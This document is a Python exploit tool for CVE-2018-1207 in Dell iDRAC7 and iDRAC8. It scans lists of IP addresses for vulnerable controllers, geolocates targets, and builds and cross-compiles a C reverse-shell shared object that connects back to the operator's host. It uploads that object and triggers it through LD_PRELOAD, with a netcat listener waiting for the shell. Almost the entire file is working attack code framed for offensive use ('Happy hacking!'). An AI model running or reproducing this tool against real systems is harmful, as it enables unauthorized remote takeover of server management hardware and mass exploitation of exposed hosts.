import requests
import sys
import os
import re
import struct
import urllib3
import time
import platform
import random
import subprocess
import threading
import json
import ipaddress
from colorama import Fore, Back, Style, init
import argparse
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed

# Initialize colorama
init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def clear_screen():
    """Clear the terminal screen based on OS."""
    os.system('cls' if platform.system() == 'Windows' else 'clear')

def print_animated(text, delay=0.02, color=Fore.WHITE):
    """Print text with animation effect."""
    for char in text:
        print(color + char, end='', flush=True)
        time.sleep(delay)
    print()

def print_banner():
    """Display the cool animated banner."""
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    banner = """
    ███╗   ██╗ █████╗ ██╗  ██╗███╗   ███╗ ██████╗       ██████╗██╗   ██╗███████╗
    ████╗  ██║██╔══██╗██║  ██║████╗ ████║██╔═══██╗     ██╔════╝██║   ██║██╔════╝
    ██╔██╗ ██║███████║███████║██╔████╔██║██║   ██║     ██║     ██║   ██║█████╗  
    ██║╚██╗██║██╔══██║██║  ██║██║╚██╔╝██║██║   ██║     ██║     ╚██╗ ██╔╝██╔══╝  
    ██║ ╚████║██║  ██║██║  ██║██║ ╚═╝ ██║╚██████╔╝     ╚██████╗ ╚████╔╝ ███████╗
    ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝       ╚═════╝  ╚═══╝  ╚══════╝
    """
    
    clear_screen()
    
    # Print banner with random colors
    for line in banner.split('\n'):
        color = random.choice(colors)
        print_animated(line, delay=0.001, color=color)
    
    # Print tagline
    print_animated(f"{Fore.CYAN}[💻] Dell iDRAC7 and iDRAC8 Remote Code Execution - CVE-2018-1207", delay=0.01)
    print_animated(f"{Fore.MAGENTA}[🔓] Vulnerable firmware versions: < 2.52.52.52", delay=0.01)
    print_animated(f"{Fore.YELLOW}[🕵️] by Hiro(skidded)", delay=0.01)
    print()

def print_status(message, status_type="info"):
    """Print status messages with appropriate formatting and emojis."""
    if status_type == "success":
        print(f"{Fore.GREEN}[✅] {message}")
    elif status_type == "error":
        print(f"{Fore.RED}[❌] {message}")
    elif status_type == "warning":
        print(f"{Fore.YELLOW}[⚠️] {message}")
    elif status_type == "info":
        print(f"{Fore.BLUE}[ℹ️] {message}")
    elif status_type == "loading":
        print(f"{Fore.CYAN}[⏳] {message}")
    elif status_type == "complete":
        print(f"{Fore.GREEN}[🚀] {message}")
    elif status_type == "geo":
        print(f"{Fore.MAGENTA}[🌎] {message}")
    elif status_type == "scan":
        print(f"{Fore.CYAN}[🔍] {message}")
    elif status_type == "vuln":
        print(f"{Fore.RED}[🔴] {message}")

def get_ip_geolocation(ip):
    """Get geolocation data for an IP address."""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                return data
    except Exception as e:
        pass
    return None

def display_geolocation(ip, is_target=True):
    """Display geolocation information for an IP address."""
    geo_data = get_ip_geolocation(ip)
    if geo_data:
        ip_type = "Target" if is_target else "Your"
        print_status(f"{ip_type} IP Location:", "geo")
        print(f"  {Fore.CYAN}➤ Country: {Fore.WHITE}{geo_data.get('country', 'Unknown')}")
        print(f"  {Fore.CYAN}➤ Region: {Fore.WHITE}{geo_data.get('regionName', 'Unknown')}")
        print(f"  {Fore.CYAN}➤ City: {Fore.WHITE}{geo_data.get('city', 'Unknown')}")
        print(f"  {Fore.CYAN}➤ ISP: {Fore.WHITE}{geo_data.get('isp', 'Unknown')}")
        print(f"  {Fore.CYAN}➤ Timezone: {Fore.WHITE}{geo_data.get('timezone', 'Unknown')}")
        if is_target:
            if geo_data.get('lat') and geo_data.get('lon'):
                print(f"  {Fore.CYAN}➤ Coordinates: {Fore.WHITE}{geo_data.get('lat')}, {geo_data.get('lon')}")
                print(f"  {Fore.CYAN}➤ Google Maps: {Fore.WHITE}https://www.google.com/maps?q={geo_data.get('lat')},{geo_data.get('lon')}")
        return True
    else:
        print_status(f"Could not retrieve geolocation data for {ip}", "warning")
        return False

def get_public_ip():
    """Get the public IP address using curl and ifconfig.me."""
    print_status("Detecting your public IP address...", "loading")
    try:
        # Try using curl
        result = subprocess.run(['curl', '-s', 'ifconfig.me'], capture_output=True, text=True)
        if result.returncode == 0 and result.stdout.strip():
            ip = result.stdout.strip()
            print_status(f"Public IP detected: {ip}", "success")
            
            # Get and display geolocation
            display_geolocation(ip, is_target=False)
            
            return ip
        
        # If curl fails, try using Python requests
        print_status("Curl failed, trying alternative method...", "warning")
        response = requests.get('https://ifconfig.me', timeout=10)
        if response.status_code == 200:
            ip = response.text.strip()
            print_status(f"Public IP detected: {ip}", "success")
            
            # Get and display geolocation
            display_geolocation(ip, is_target=False)
            
            return ip
            
    except Exception as e:
        print_status(f"Error detecting public IP: {e}", "error")
    
    print_status("Failed to detect public IP automatically.", "error")
    return None

def generate_random_port():
    """Generate a random 5-digit port number (10000-65535)."""
    return random.randint(10000, 65535)

def start_netcat_listener(port):
    """Start a netcat listener in a separate thread."""
    print_status(f"Starting netcat listener on port {port}...", "loading")
    
    def run_netcat():
        if platform.system() == 'Windows':
            # For Windows (if ncat is available)
            subprocess.run(['ncat', '-v', '-l', '-p', str(port)])
        else:
            # For Linux/Mac
            subprocess.run(['nc', '-v', '-l', '-p', str(port)])
    
    listener_thread = threading.Thread(target=run_netcat)
    listener_thread.daemon = True  # Thread will exit when main program exits
    listener_thread.start()
    
    print_status(f"Netcat listener started on port {port}", "success")
    return listener_thread

def check_vulnerability(url, timeout):
    """Check if the target is vulnerable."""
    try:
        r = requests.get(f"{url}/cgi-bin/login?LD_DEBUG=files", verify=False, timeout=timeout)
        vul = re.search(r'calling init: /lib/', r.text)
        if vul:
            return True
        else:
            return False
    except Exception as e:
        return False

def generate_payload(lhost, lport, payloadc):
    """Generate the C payload for reverse shell."""
    print_status("Generating payload...", "loading")
    
    if os.path.exists(payloadc):
        os.unlink(payloadc)
        
    payload = ("""
    #include <stdlib.h>
    #include <unistd.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    static void main(void) __attribute__((constructor));
    static void main(void)
    {
           int pid = fork();
           if(!pid) {
                    int sock = socket(AF_INET, SOCK_STREAM, 0);
                    struct sockaddr_in serv_addr = {0};
                    serv_addr.sin_family = AF_INET;
                    serv_addr.sin_port = htons(%d);
                    serv_addr.sin_addr.s_addr = inet_addr("%s");
                    connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
                    dup2(sock, 0);
                    dup2(sock, 1);
                    dup2(sock, 2);
                    execl("/bin/sh", "/bin/sh", NULL);
            }
    }
    """) % (int(lport), lhost)
    
    try:
        with open(payloadc, 'w') as file:
            file.write(payload)
        print_status("Payload source created successfully", "success")
        return True
    except Exception as e:
        print_status(f"Error creating payload: {e}", "error")
        return False

def compile_payload(payloadc, payloadbin):
    """Compile the C payload to a shared object file."""
    print_status("Compiling payload...", "loading")
    
    if not os.path.exists(payloadc):
        print_status("Payload source file not found!", "error")
        return False
        
    cmd = os.system('sh4-linux-gnu-gcc-11 -shared -fPIC ./payload.c -o ./payload.so 2>/dev/null')
    exit_code = os.WEXITSTATUS(cmd)
    
    if exit_code == 0:
        print_status("Payload compiled successfully", "success")
        return True
    else:
        print_status("Error compiling payload", "error")
        print_status("Make sure you have gcc-11-sh4-linux-gnu installed:", "info")
        print_status("  sudo apt-get install gcc-11-sh4-linux-gnu", "info")
        return False

def upload_payload(url, payloadbin, timeout):
    """Upload the compiled payload to the target."""
    print_status("Uploading payload to target...", "loading")
    
    try:
        FFLAGS = 1
        with open(payloadbin, 'rb') as f:
            payload_so = f.read()
        
        f_alias = 'RACPKSSHAUTHKEY1'
        res = bytes((f_alias + (32 - len(f_alias)) * '\0'), 'utf-8')
        res += struct.pack('<L', len(payload_so))
        res += struct.pack('<L', FFLAGS)
        res += payload_so
        
        # Show progress bar for upload
        print()
        for i in tqdm(range(100), desc="Uploading", bar_format="{l_bar}%s{bar}%s{r_bar}" % (Fore.GREEN, Fore.RESET)):
            time.sleep(0.01)  # Simulate upload progress
        print()
        
        r = requests.post(f"{url}/cgi-bin/putfile", data=res, verify=False, timeout=timeout)
        
        if r.status_code == 200:
            print_status("Payload uploaded successfully", "success")
            return True
        else:
            print_status(f"Failed to upload payload. Status code: {r.status_code}", "error")
            return False
            
    except Exception as e:
        print_status(f"Error uploading payload: {e}", "error")
        return False

def trigger_exploit(url, timeout):
    """Trigger the exploit to get a reverse shell."""
    print_status("Triggering exploit...", "loading")
    
    try:
        # Show countdown
        print()
        for i in range(5, 0, -1):
            print(f"{Fore.YELLOW}Starting reverse shell in {i} seconds...{Style.RESET_ALL}", end='\r')
            time.sleep(1)
        print(f"{Fore.GREEN}Launching attack now!                   {Style.RESET_ALL}")
        print()
        
        r = requests.get(f"{url}/cgi-bin/discover?LD_PRELOAD=/tmp/sshpkauthupload.tmp", verify=False, timeout=timeout)
        print_status("Exploit triggered", "complete")
        return True
        
    except requests.exceptions.ReadTimeout:
        # This timeout is expected as the connection should be handled by netcat
        print_status("Connection timeout - this is normal if the exploit succeeded", "info")
        return True
    except Exception as e:
        print_status(f"Error triggering exploit: {e}", "error")
        return False

def cleanup(payloadc, payloadbin):
    """Clean up temporary files."""
    print_status("Cleaning up temporary files...", "loading")
    
    if os.path.exists(payloadc):
        os.unlink(payloadc)
        
    if os.path.exists(payloadbin):
        os.unlink(payloadbin)
        
    print_status("Cleanup complete", "success")

def scan_single_target(ip, port, timeout):
    """Scan a single target IP for vulnerability."""
    url = f'https://{ip}:{port}'
    try:
        is_vuln = check_vulnerability(url, timeout)
        return ip, is_vuln
    except Exception as e:
        return ip, False

def scan_targets_from_file(file_path, port, timeout, max_workers=10):
    """Scan multiple targets from a file for vulnerabilities."""
    print_status(f"Loading targets from file: {file_path}", "scan")
    
    try:
        with open(file_path, 'r') as f:
            ips = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print_status(f"Error reading file: {e}", "error")
        return []
    
    total_ips = len(ips)
    print_status(f"Loaded {total_ips} targets for scanning", "info")
    
    vulnerable_targets = []
    
    print_status("Starting vulnerability scan...", "scan")
    print()
    
    # Create a progress bar for the scan
    progress_bar = tqdm(total=total_ips, desc="Scanning", bar_format="{l_bar}%s{bar}%s{r_bar}" % (Fore.CYAN, Fore.RESET))
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit all tasks
        future_to_ip = {executor.submit(scan_single_target, ip, port, timeout): ip for ip in ips}
        
        # Process results as they complete
        for future in as_completed(future_to_ip):
            ip = future_to_ip[future]
            try:
                ip, is_vulnerable = future.result()
                if is_vulnerable:
                    vulnerable_targets.append(ip)
                    print_status(f"Found vulnerable iDRAC: {ip}", "vuln")
            except Exception as e:
                pass
            finally:
                progress_bar.update(1)
    
    progress_bar.close()
    print()
    
    return vulnerable_targets

def save_vulnerable_targets(vulnerable_targets, output_file="vulnerable_idrac.txt"):
    """Save the list of vulnerable targets to a file."""
    if not vulnerable_targets:
        return False
        
    try:
        with open(output_file, 'w') as f:
            for ip in vulnerable_targets:
                f.write(f"{ip}\n")
        print_status(f"Saved {len(vulnerable_targets)} vulnerable targets to {output_file}", "success")
        return True
    except Exception as e:
        print_status(f"Error saving vulnerable targets: {e}", "error")
        return False

def main():
    parser = argparse.ArgumentParser(description="Dell iDRAC7/8 RCE Exploit (CVE-2018-1207)")
    parser.add_argument("--target", help="Target host IP address for direct exploitation")
    parser.add_argument("--scan-file", help="File containing IP addresses to scan for vulnerabilities")
    parser.add_argument("--max-threads", type=int, default=10, help="Maximum number of concurrent scanning threads (default: 10)")
    parser.add_argument("--port", default="443", help="Target port (default: 443)")
    parser.add_argument("--lhost", help="Local host IP for reverse shell (auto-detected if not specified)")
    parser.add_argument("--lport", help="Local port for reverse shell (random 5-digit port if not specified)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("--no-cleanup", action="store_true", help="Don't remove temporary files after execution")
    parser.add_argument("--no-listener", action="store_true", help="Don't start netcat listener automatically")
    parser.add_argument("--no-geo", action="store_true", help="Skip geolocation lookup")
    parser.add_argument("--output", default="vulnerable_idrac.txt", help="Output file for vulnerable targets (default: vulnerable_idrac.txt)")
    
    args = parser.parse_args()
    
    print_banner()
    
    # Check if either target or scan-file is provided
    if not args.target and not args.scan_file:
        # Ask user for mode selection
        print(f"{Fore.CYAN}[?] Select operation mode:{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[1] Target a single IP")
        print(f"{Fore.GREEN}[2] Scan multiple IPs from a file{Style.RESET_ALL}")
        
        mode = input(f"{Fore.YELLOW}[?] Enter mode (1/2): {Style.RESET_ALL}")
        
        if mode == "1":
            args.target = input(f"{Fore.YELLOW}[?] Enter target IP address: {Style.RESET_ALL}")
            if not args.target:
                print_status("No target IP provided. Exiting.", "error")
                sys.exit(1)
        elif mode == "2":
            args.scan_file = input(f"{Fore.YELLOW}[?] Enter file path containing target IPs: {Style.RESET_ALL}")
            if not args.scan_file or not os.path.exists(args.scan_file):
                print_status(f"File not found: {args.scan_file}", "error")
                sys.exit(1)
        else:
            print_status("Invalid mode selected. Exiting.", "error")
            sys.exit(1)
    
    port = args.port
    timeout = args.timeout
    
    # If scanning mode is selected
    if args.scan_file:
        print_status(f"Running in scan mode with file: {args.scan_file}", "scan")
        vulnerable_targets = scan_targets_from_file(args.scan_file, port, timeout, args.max_threads)
        
        if vulnerable_targets:
            print_status(f"Found {len(vulnerable_targets)} vulnerable iDRAC systems:", "complete")
            for i, ip in enumerate(vulnerable_targets, 1):
                print(f"{Fore.RED}[{i}] {ip}{Style.RESET_ALL}")
            
            # Save results
            save_vulnerable_targets(vulnerable_targets, args.output)
            
            # Ask if user wants to exploit one of the vulnerable targets
            if vulnerable_targets:
                exploit_now = input(f"{Fore.YELLOW}[?] Do you want to exploit one of these targets now? (y/n): {Style.RESET_ALL}")
                if exploit_now.lower() == 'y':
                    target_index = input(f"{Fore.YELLOW}[?] Enter the number of the target to exploit (1-{len(vulnerable_targets)}): {Style.RESET_ALL}")
                    try:
                        target_index = int(target_index) - 1
                        if 0 <= target_index < len(vulnerable_targets):
                            args.target = vulnerable_targets[target_index]
                            print_status(f"Selected target: {args.target}", "info")
                        else:
                            print_status("Invalid target number. Exiting.", "error")
                            sys.exit(0)
                    except ValueError:
                        print_status("Invalid input. Exiting.", "error")
                        sys.exit(0)
                else:
                    print_status("Scan complete. Exiting.", "complete")
                    sys.exit(0)
        else:
            print_status("No vulnerable iDRAC systems found.", "warning")
            sys.exit(0)
    
    # If we're in exploit mode (either from direct target or selected from scan)
    if args.target:
        host = args.target
        
        # Display target geolocation
        if not args.no_geo:
            display_geolocation(host, is_target=True)
            print()
        
        # Get public IP if not specified
        lhost = args.lhost
        if not lhost:
            lhost = get_public_ip()
            if not lhost:
                print_status("Failed to auto-detect IP. Please specify your local IP with --lhost", "error")
                sys.exit(1)
            print()  # Add spacing after geolocation info
                
        # Generate random 5-digit port if not specified
        lport = args.lport
        if not lport:
            lport = generate_random_port()
            print_status(f"Generated random port: {lport}", "info")
        else:
            lport = int(lport)
        
        url = f'https://{host}:{port}'
        payloadc = 'payload.c'
        payloadbin = 'payload.so'
        
        print_status(f"Target: {url}", "info")
        print_status(f"Reverse Shell: {lhost}:{lport}", "info")
        print_status(f"Timeout: {timeout} seconds", "info")
        print()
        
        # Start netcat listener if requested
        if not args.no_listener:
            try:
                listener_thread = start_netcat_listener(lport)
            except Exception as e:
                print_status(f"Failed to start netcat listener: {e}", "error")
                print_status("Continuing without listener. Make sure to start one manually:", "warning")
                print_status(f"  nc -v -l -p {lport}", "info")
        else:
            print_status("Skipping automatic listener due to --no-listener flag", "info")
            print_status(f"Make sure to start one manually: nc -v -l -p {lport}", "warning")
        
        # Check vulnerability
        print_status("Checking if target is vulnerable...", "loading")
        if not check_vulnerability(url, timeout):
            print_status(f"Target {url} does not appear to be vulnerable.", "error")
            sys.exit(1)
        print_status(f"Target {url} is vulnerable!", "success")
            
        # Generate and compile payload
        if not generate_payload(lhost, lport, payloadc):
            sys.exit(1)
            
        if not compile_payload(payloadc, payloadbin):
            sys.exit(1)
            
        # Upload and trigger exploit
        if not upload_payload(url, payloadbin, timeout):
            sys.exit(1)
            
        if not trigger_exploit(url, timeout):
            sys.exit(1)
            
        print_status("Attack complete!", "complete")
        print_status(f"Check your listener on port {lport} for incoming connection", "info")
        print_status("If you started the listener with this script, watch for the connection above", "info")
        
        # Cleanup
        if not args.no_cleanup:
            cleanup(payloadc, payloadbin)
        else:
            print_status("Skipping cleanup due to --no-cleanup flag", "info")
        
        print(f"\n{Fore.CYAN}[🌟] Thanks for using Hiro-CVE! Happy hacking! [🌟]{Style.RESET_ALL}")
        
        # Keep script running if we started a listener
        if not args.no_listener:
            print_status("Keeping script running for the listener. Press Ctrl+C to exit.", "info")
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print(f"\n\n{Fore.RED}[❌] Operation cancelled by user{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}[❌] Operation cancelled by user{Style.RESET_ALL}")
        sys.exit(0)